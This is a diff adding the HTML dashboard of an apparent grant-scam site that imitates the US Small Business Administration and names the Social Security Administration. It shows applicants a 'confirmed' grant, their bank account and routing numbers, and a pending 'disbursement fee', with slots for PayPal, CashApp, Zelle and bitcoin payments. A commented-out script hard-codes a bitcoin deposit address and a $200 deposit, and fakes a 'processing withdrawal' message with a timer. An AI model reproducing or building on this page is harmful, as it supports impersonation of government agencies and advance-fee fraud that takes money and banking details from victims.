@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>SBA Funds Grant Program | Empowering Communities | Social Security Adminstration Grant</title>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta content="" name="keywords">
+  <meta content="" name="description">
+
+
+  <!-- Favicon -->
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+
+  <!-- Google Web Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Jost:wght@500;600;700&family=Open+Sans:wght@400;500&display=swap" rel="stylesheet">  
+
+  <!-- Icon Font Stylesheet -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+  <!-- Libraries Stylesheet -->
+  <link href="lib/animate/animate.min.css" rel="stylesheet">
+  <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+
+  <!-- Customized Bootstrap Stylesheet -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Template Stylesheet -->
+  <link href="css/style.css" rel="stylesheet">
+  <link rel="stylesheet" href="css/uikit.css">
+
+<!-- Chatra {literal} -->
+<script>
+  (function(d, w, c) {
+      w.ChatraID = 'iQEmH5A5EdpsBziJw';
+      var s = d.createElement('script');
+      w[c] = w[c] || function() {
+          (w[c].q = w[c].q || []).push(arguments);
+      };
+      s.async = true;
+      s.src = 'https://call.chatra.io/chatra.js';
+      if (d.head) d.head.appendChild(s);
+  })(document, window, 'Chatra');
+</script>
+<!-- /Chatra {/literal} -->
+
+  <style>
+    /* Custom styles for the sidebar and content area */
+    body {
+      margin: 0;
+      padding: 0;
+    }
+
+ 
+     /* Custom styles for the cards */
+     .custom-card {
+      border: none;
+      border-radius: 20px;
+      background: white;
+      color: black;
+    }
+
+    .custom-card h5 {
+      color: #555;
+    }
+    
+
+    .custom-card .card-text {
+      font-size: 24px;
+    }
+
+    @media (max-width: 768px) {
+  
+    #dashboard-container {
+      height: 100%;
+    }
+
+    #content {
+        margin-right: 0;
+        min-width: 100px;
+        margin-left: 150px;
+    overflow-y: inherit;
+        }
+
+        .dashboarda {
+      display: none;
+    }
+
+  }
+
+  
+
+/* Style for the fancy button */
+.fancy-button {
+  background-color: #355EFC;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 25px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.fancy-button:hover {
+  background-color: #1E40AF;
+}
+
+.fancy-button:disabled {
+  background-color: #9db2bd;
+  cursor: not-allowed;
+}
+
+.modal-lock {
+  display: none;
+  justify-content: center;
+  align-items: center;
+  width: 100%;
+  height: 100%;
+  position: fixed;
+  background-color: rgba(0, 0, 0, 0.6);
+  z-index: 200;
+}
+
+.lock-wrapper {
+  width: 400px;
+  height: 300px;
+  background-color: white;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  border-radius: 15px;
+  font-size: 26px;
+  font-weight: bold;
+}
+
+.et-hero-tabs {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  height: 23vh;
+  position: relative;
+  background: #eee;
+  text-align: center;
+  padding: 0 2em;
+}
+
+.et-hero-tabs-container--top {
+  position: fixed;
+  top: 80px;
+}
+.et-hero-tabs-container {
+  display: flex;
+  flex-direction: row;
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  height: 70px;
+  box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  z-index: 10;
+}
+
+@media (min-width: 800px) {
+  .et-hero-tab {
+    font-size: 1rem;
+  }
+}
+.et-hero-tab {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex: 1;
+  color: #000;
+  letter-spacing: 0.1rem;
+  transition: all 0.5s ease;
+  font-size: 0.8rem;
+}
+
+.et-slide {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  position: relative;
+  background: #eee;
+  text-align: center;
+  padding: 10px 20px;
+}
+
+.dashboarda {
+  background-color: white;
+  width: 100%;
+  border: #e5e5e5 solid 2px;
+  display: flex;
+  color: #070054;
+  justify-content: space-between;
+  padding: 20px 50px;
+  margin: 0 20px;
+  text-align: left;
+}
+
+.dashboarda > div.full > div {
+  border-bottom: #e5e5e5 solid 2px;
+  width: 100%;
+  position: relative;
+  padding: 10px 0px;
+}
+
+.dashboardab {
+  background-color: white;
+  width: 100%;
+  border: #e5e5e5 solid 2px;
+  color: #070054;
+  justify-content: center;
+  padding: 20px 50px;
+  margin: 0 20px;
+  text-align: left;
+}
+
+  </style>
+
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-firestore.js"></script>
+</head>
+<body>
+
+          <!-- Navbar Start -->
+          <div class="container-fluid fixed-top px-0 wow fadeIn" data-wow-delay="0.1s">
+            <div class="top-bar row gx-0 align-items-center d-none d-lg-flex">
+                
+              <div class="col-lg-6 px-5 text-start">
+                  <small><i class="fa fa-map-marker-alt text-primary me-2"></i>409 3rd St SW, Washington, DC 20416, United States</small>
+                  <small class="ms-4"><i class="fa fa-clock text-primary me-2"></i>9.00 am - 9.00 pm</small>
+                  <small class="ms-4"><i class="text-primary me-2"></i></small>
+  
+              </div>
+          </div>
+    
+    
+            <nav class="navbar navbar-expand-lg navbar-light py-lg-0 px-lg-5 wow fadeIn" data-wow-delay="0.1s">
+                
+                <a href="index.html" class="navbar-brand ms-4 ms-lg-0">
+                    <img src="img/logo-horizontal.svg"/>
+                    <!-- <h1 class="display-5 m-0">SBAGrant</h1> -->
+                </a> 
+                <button type="button" class="navbar-toggler me-4" data-bs-toggle="collapse" data-bs-target="#navbarCollapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                
+                <div class="collapse navbar-collapse" id="navbarCollapse">
+                    <div class="navbar-nav ms-auto p-4 p-lg-0">
+                        <a href="index.html" class="nav-item nav-link active">Home</a>
+                        <a href="" class="nav-item nav-link">About</a>
+                        <a href="" class="nav-item nav-link">Services</a>
+
+    
+                        <a href="" class="nav-item nav-link">Contact</a>
+                        
+                        <a href="" id="signout" class="nav-item nav-link">Logout</a>
+                        <div class="uk-flex uk-flex-center nav-item nav-link" style="margin-top: -6px;">
+                            <a href="dashboard.html" class="uk-button uk-button-default uk-button-large uk-border-rounded uk-margin-small-right" style="background-color: #070054; color: white;"><i class="fas fa-user"></i></a>
+                            <!-- <a href="signup.html" class="uk-button uk-button-primary uk-button-small uk-border-rounded">Create Account</a> -->
+                        </div>
+                       
+                    </div>
+                </div>
+            </nav>
+        </div>
+        <!-- Navbar End -->
+
+        <section class="et-hero-tabs" style="margin-top: 40px;">
+          <div class="et-hero-tabs-container et-hero-tabs-container--top">
+              <a class="et-hero-tab" href="#tab-es6">Application</a>
+              <a class="et-hero-tab" href="#tab-flexbox">Disbursement</a>
+              <a class="et-hero-tab" href="#tab-react">Verification</a>
+              <span class="et-hero-tab-slider" style="width: 0px; left: 0px;"></span>
+          </div>
+      </section>
+
+      <main class="et-main" >
+        <section class="et-slide" id="tab-es6">           
+          <div class="container p-0 d-flex justify-center">
+          
+                    <div class="dashboardab">
+                                  <div>
+                                      <p style="margin-top: 10px;">Your Quote</p>
+                                      <div class="alert alert-secondary">
+                                      <p><strong>Status: </strong>Amount Confirmed</p>
+                                      <h4 id="confirmedAmount">Loading...</h4>
+                                      </div>
+                                  </div>
+                                  <div>
+                                      <p>Status:</p>
+                                      <div id="statusMessage"></div>                                          
+                                      
+                                  </div>
+                                  
+                      </div> 
+                      <!-- <div class="dashboarda">
+                      <div class="full">
+                                  <p>Applicant</p>
+                                </div>
+                      </div> -->
+                </div>
+                <div class="container p-0 d-flex justify-center">
+        <div class="dashboarda">
+                    <div class="full">
+                        <p>Your Profile</p>
+                        <div class="">
+                            <div class="media contact-info p-0 m-0" style="width: 100% !important;">
+                              <span class="contact-info__icon"><i class="ti-user"></i></span>
+                            <div class="media-body">
+                                <h3 id="userName" style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;letter-spacing:0 !important;"> </h3>
+                                <p id="userEmail"></p>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="">
+                        <div class="media contact-info p-0 m-0" style="width: 100% !important;">
+                              <span class="contact-info__icon"><i class="ti-layers"></i></span>
+                            <div class="media-body">
+                                <h3 style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;letter-spacing:0 !important;">Beneficiary Bank: <span id="beneficiaryBank"></span></h3>
+                                <p class="m-0">Account Number: <span id="accountNumber"></span></p>
+                                <p class="m-0">Routing No.: <span id="routingNumber"></span></p>
+                                <p class="m-0 ">Beneficiary Bank Address: <span id="beneficiaryBankAddress"></span></p>
+                                <p class="m-0 ">Applied Amount: <span id="appliedAmount" style="color:green"></span></p>
+                            </div>
+                          </div>
+                        <p></p>
+                        </div>
+                    </div>
+        </div>
+  </div>
+        </section>
+        <section class="et-slide" id="tab-flexbox">
+<div class="container p-0 d-flex justify-center">
+        <div class="dashboarda">
+                    <div>
+                        <p>Advance Type</p>
+                        <div class="">
+                        <p>Disbursement fee</p>
+                        <h4 id="disbursementFee"></h4>
+                        </div>
+                    </div>
+                    <div>
+                        <p>Status:</p>
+                          <h6>Pending</h6>                                                       
+                    </div>
+        </div>
+    </div>
+    <!-- <div class="container p-0 d-flex justify-center">
+        <div class="dashboarda">
+                    <div>
+                        <p>Advance Type</p>
+                        <div class="">
+                        <p>Over Age Payment</p>
+                        <h4>$0.00</h4>
+                        </div>
+                    </div>
+                    <div>
+                        <p>Status:</p>
+                          <h6>Pending</h6>                                                       
+                    </div>
+        </div>
+    </div> -->
+        </section>
+        <section class="et-slide" id="tab-react">
+<div class="container p-0 d-flex justify-center">
+        <div class="dashboarda">
+                    <div class="full">
+                        <p>Steps to complete</p>
+                        <div class="">
+                        <p>Verify Identification</p>
+                        <h6 class="success">Completed!</h6>
+                        <!--<a class="btn" target="_blank" href="/img/upload/verification_doc/image-96970.jpeg">view</a>-->
+                        <a class="btn">view</a>
+                        </div>
+                        <div class="">
+                        <p>Electronic Disbursement</p>
+                        <h6 class="success">Pending</h6>
+                        <!-- <a class="btn" href="/view">view</a> -->
+                        </div>
+                    </div>
+        </div>
+  </div>
+        </section>
+        <section class="et-slide">
+<div class="container p-0 d-flex justify-center">
+        <div class="dashboarda">
+                    <div class="full">
+                        <p>Payment Accounts</p>
+                        <!-- <div class=""> -->
+                        <!-- <p>Bank Account Details</p>
+                        <h6 class="success">SBA DISBURSEMENT ACCOUNT </h6>
+                        <h6 class="success">Janice Crowder</h6>
+                        <h6 class="success">3 </h6>
+                        <h6 class="success"> 5</h6>
+                        <h6 class="success"> 4</h6> -->
+                        <!--<h6 class="success"></h6>-->
+                        <!-- </div> -->
+                        <div class="">
+                        <p>Paypal</p>
+                        <h6 id="paypal" class="success"></h6>
+                        </div>
+                        <div class="">
+                        <p>Venmo</p>
+                        <h6 class="success"></h6>
+                        </div>
+                        <div class="">
+                        <p>CashApp</p>
+                        <h6 id="cashapp" class="success"></h6>
+                        </div>
+                        <div class="">
+                        <p>bitcoin Address</p>
+                        <h6 id="btcaddress" class="success"></h6>
+                        </div>
+                        <div class="">
+                        <p>Zelle</p>
+                        <h6 class="success"></h6>
+                        </div>
+                        <div class="">
+                          <p>Apple Pay</p>
+                          <h6 class="success"></h6>
+                          </div>
+                        <!--<div class="">-->
+                        <!--<p>Paypal</p>-->
+                        <!--<h6 class="success"></h6>-->
+                        <!--</div>-->
+                        
+                    </div>
+        </div>
+  </div>
+        </section>
+    </main>
+
+  <!-- <div class="modal-lock" id="modal-lock">
+    <div class="lock-wrapper">
+      <img src="img/lock_icon.png" width="30%"/>
+      <p id="lock-text"></p>
+    </div>
+  </div> -->
+ 
+ 
+  <!-- Footer Start -->
+  <div class="container-fluid bg-dark text-light footer mt-5 py-5 wow fadeIn" data-wow-delay="0.1s">
+    <div class="container py-5">
+        <div class="row g-5">
+            <div class="col-lg-3 col-md-6">
+                <h4 class="text-white mb-4">Our Office</h4>
+                <p class="mb-2"><i class="fa fa-map-marker-alt me-3"></i>409 3rd St SW, Washington, DC 20416, United States</p>
+                <p class="mb-2"><i class="fa fa-phone-alt me-3"></i>(646) 820-2049</p>
+                <p class="mb-2"><i class="fa fa-envelope me-3"></i>support@sbastartupsupport.com</p>
+                <div class="d-flex pt-2">
+                    <a class="btn btn-square btn-outline-light rounded-circle me-2" href=""><i class="fab fa-twitter"></i></a>
+                    <a class="btn btn-square btn-outline-light rounded-circle me-2" href=""><i class="fab fa-facebook-f"></i></a>
+                    <a class="btn btn-square btn-outline-light rounded-circle me-2" href=""><i class="fab fa-youtube"></i></a>
+                    <a class="btn btn-square btn-outline-light rounded-circle me-2" href=""><i class="fab fa-linkedin-in"></i></a>
+                </div>
+            </div>
+            <div class="col-lg-3 col-md-6">
+                <h4 class="text-white mb-4">Services</h4>
+                <a class="btn btn-link" href="">Business Grant</a>
+                <a class="btn btn-link" href="">Educational Outreach</a>
+                <a class="btn btn-link" href="">Financial Consultancy</a>
+                <a class="btn btn-link" href="">Personal Grants</a>
+                <a class="btn btn-link" href="">Start-up Support</a>
+
+
+            </div>
+            <div class="col-lg-3 col-md-6">
+                <h4 class="text-white mb-4">Quick Links</h4>
+                <a class="btn btn-link" href="about.html">Frequently Asked Questions</a>
+                <a class="btn btn-link" href="contact.html">Contact Us</a>
+                <a class="btn btn-link" href="">Privacy Policy</a>
+                <a class="btn btn-link" href="">Terms & Condition</a>
+                <a class="btn btn-link" href="">Support</a>
+            </div>
+            <div class="col-lg-3 col-md-6">
+                <h4 class="text-white mb-4">Newsletter</h4>
+                <p>Subscribe to our Newsletter for more updates.</p>
+                <div class="position-relative w-100">
+                    <input class="form-control bg-white border-0 w-100 py-3 ps-4 pe-5" type="text" placeholder="Your email">
+                    <button type="button" class="btn btn-primary py-2 position-absolute top-0 end-0 mt-2 me-2">SignUp</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- Footer End -->
+
+
+<!-- Copyright Start -->
+<div class="container-fluid copyright py-4">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
+                &copy; <a class="border-bottom" href="#">Copyright ©2024 All rights reserved | SBAGRANT.US</a>
+            </div>
+            <!-- <div class="col-md-6 text-center text-md-end"> -->
+                <!--/*** This template is free as long as you keep the footer author’s credit link/attribution link/backlink. If you'd like to use the template without the footer author’s credit link/attribution link/backlink, you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". Thank you for your support. ***/-->
+                <!-- Designed By <a class="border-bottom" href="https://htmlcodex.com">HTML Codex</a> -->
+            <!-- </div> -->
+        </div>
+    </div>
+</div>
+<!-- Copyright End -->
+
+<!-- Javascript -->
+<script src="js/uikit.min.js"></script>
+<script src="js/jquery.min.js"></script>
+
+<script src="auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-firestore.js"></script>
+
+
+<!-- JavaScript Libraries -->
+<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="lib/wow/wow.min.js"></script>
+<script src="lib/easing/easing.min.js"></script>
+<script src="lib/waypoints/waypoints.min.js"></script>
+<script src="lib/owlcarousel/owl.carousel.min.js"></script>
+<script src="lib/counterup/counterup.min.js"></script>
+
+<script src="js/uikit.min.js"></script>
+<script src="js/in-core.js"></script>
+<script src="js/config.js"></script>
+
+<!-- Template Javascript -->
+<script src="js/main.js"></script>
+
+<script src="firebase.js"></script>
+<script src="auth.js"></script>
+
+
+
+  <!-- <script>
+    // JavaScript to toggle the sidebar
+    document.getElementById('sidebarCollapse').addEventListener('click', function () {
+      document.getElementById('sidebar').classList.toggle('active');
+    });
+
+    // JavaScript to toggle content sections
+    const sidebarLinks = document.querySelectorAll('.sidebar-link');
+    const contentSections = document.querySelectorAll('.content-section');
+
+    sidebarLinks.forEach((link, index) => {
+      link.addEventListener('click', function (event) {
+        event.preventDefault();
+        contentSections.forEach(section => section.classList.remove('active'));
+        contentSections[index].classList.add('active');
+      });
+    });
+
+    // Show Dashboard Overview content by default
+    // contentSections[0].classList.add('active');
+
+    const logoutButton = document.getElementById('signout');
+
+if (logoutButton) {
+    logoutButton.addEventListener('click', function() {
+        firebase.auth().signOut().then(() => {
+            console.log('Signup clicked!');
+// Sign-out successful.
+}).catch((error) => {
+// An error happened.
+});
+
+});
+}
+
+function toggleDepositButton() {
+    const depositAmountInput = document.getElementById('depositAmount');
+    const depositButton = document.getElementById('depositButton');
+
+    if (depositAmountInput.value.trim() !== '') {
+      depositButton.disabled = false;
+    } else {
+      depositButton.disabled = true;
+    }
+  }
+
+  async function fetchBTCRate() {
+    try {
+      const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+      const btcRateUSD = response.data.bitcoin.usd;
+      return btcRateUSD;
+    } catch (error) {
+      console.error('Error fetching BTC rate:', error);
+      return null;
+    }
+  }
+
+  async function updateConversion() {
+    const depositAmountInput = document.getElementById('depositAmount');
+    const depositButton = document.getElementById('depositButton');
+    const conversionOutput = document.getElementById('conversionOutput');
+
+    const btcRateUSD = await fetchBTCRate();
+
+    if (btcRateUSD === null) {
+      // Handle error when fetching BTC rate
+      return;
+    }
+
+    if (depositAmountInput.value.trim() !== '') {
+      const usdAmount = parseFloat(depositAmountInput.value);
+      const btcAmount = (usdAmount / btcRateUSD).toFixed(8);
+      conversionOutput.textContent = `${btcAmount} BTC @ 1 BTC = ${btcRateUSD.toFixed(2)} USD`;
+      depositButton.disabled = false;
+    } else {
+      conversionOutput.textContent = '';
+      depositButton.disabled = true;
+    }
+  }
+
+  // Call updateConversion on page load to set the initial conversion output
+  updateConversion();
+
+  function copyToClipboard(inputId) {
+    const inputElement = document.getElementById(inputId);
+    inputElement.select();
+    document.execCommand('copy');
+  }
+
+  const depositButton = document.getElementById('depositButton');
+  const depositModal = new bootstrap.Modal(document.getElementById('depositModal'));
+
+  // Add an event listener to the Deposit button to open the modal on click
+  if (depositButton) {
+    depositButton.addEventListener('click', function () {
+      // You can update the values of BTC address, USD amount, and BTC amount here
+      // For now, let's assume they are hard-coded
+      document.getElementById('btcAddress').value = 'bc1q9g73vud4sa7rs0g2dtrswckkvyzmm736vu657t';
+      document.getElementById('usdAmount').value = '200.00 USD';
+      document.getElementById('btcAmount').value = '0.0002 BTC';
+      
+      depositModal.show();
+    });
+  }
+
+  // withdraw popup
+  document.addEventListener('DOMContentLoaded', function () {
+  // Get input elements and the withdraw button
+  var inputElements = document.querySelectorAll('.withdraw-form input');
+  var withdrawButton = document.getElementById('withdrawButton');
+  var withdrawAmountInput = document.getElementById('withdrawAmount');
+  var balanceField = document.getElementById('balance-field');
+
+
+  // Disable the withdraw button initially
+  withdrawButton.disabled = true;
+
+  // Add input event listeners to check if all fields are filled
+  inputElements.forEach(function (input) {
+    input.addEventListener('input', function () {
+      var allFilled = Array.from(inputElements).every(function (input) {
+        return input.value.trim() !== '';
+      });
+
+      // Enable the withdraw button if all fields are filled
+      withdrawButton.disabled = !allFilled;
+    });
+  });
+
+  // Get the modal and buttons
+  var modal = new bootstrap.Modal(document.getElementById('popupModal'));
+  var showPopupButton = document.getElementById('withdrawButton');
+  var closePopupButton = document.getElementById('closePopupButton');
+
+
+  // Show the modal when the withdraw button is clicked
+  showPopupButton.addEventListener('click', function () {
+    modal.show();
+  });
+
+  // Clear input fields and hide modal when "OK" button is clicked
+  closePopupButton.addEventListener('click', function () {
+    inputElements.forEach(function (input) {
+      input.value = '';
+    });
+
+    modal.hide();
+  });
+
+  // Restrict withdrawAmount input to not exceed $0
+  withdrawAmountInput.addEventListener('input', function () {
+    var enteredValue = parseFloat(withdrawAmountInput.value);
+    var balance = parseFloat(balanceField.textContent.replace('$', ''));
+
+if (isNaN(enteredValue) || enteredValue <= 0 || enteredValue > balance) {
+  withdrawAmountInput.value = '';
+}
+  });
+});
+
+document.querySelector('#popupModal button.btn-primary').addEventListener('click', function () {
+  // Assuming you have paid successfully, show the loader and message
+  document.getElementById('continueWithdrawal').style.display = 'none'
+  document.getElementById('closePopupButton').style.display = 'none'
+
+  document.getElementById('popupModalLabel').style.display = 'none'
+
+  
+  document.getElementById('loader').classList.remove('d-none');
+  document.getElementById('message').textContent = 'Processing and Verifying Withdrawal...';
+
+  // You can add additional logic for processing and verifying the deposit here
+
+  // After a certain amount of time (simulating processing), display success message
+  setTimeout(function () {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('message').textContent = 'Wait for 10-30 minutes for confirmation, system will verify and credit your bank account!';
+  }, 5000); // Simulating 3 seconds processing time
+});
+
+
+
+  </script> -->
+
+
+</body>
+</html>
